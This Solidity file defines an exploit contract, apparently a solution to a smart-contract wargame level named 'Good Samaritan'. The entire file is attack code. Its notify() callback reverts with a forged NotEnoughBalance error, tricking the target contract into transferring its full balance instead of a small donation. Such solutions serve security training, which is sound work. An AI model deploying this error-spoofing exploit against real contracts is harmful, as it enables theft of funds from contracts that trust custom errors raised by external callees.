// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGoodSamaritan {
    function requestDonation() external returns(bool enoughBalance);
}

contract GoodSamaritanHack {
    address public target;
    error NotEnoughBalance();

    constructor(address _target) {
        target = _target;
    }

    function hack() external {
        IGoodSamaritan(target).requestDonation();
    }

    function notify(uint256 amount_) external {
        if (amount_ == 10) {
            revert NotEnoughBalance();
        } else {
            true;
        }
    }
}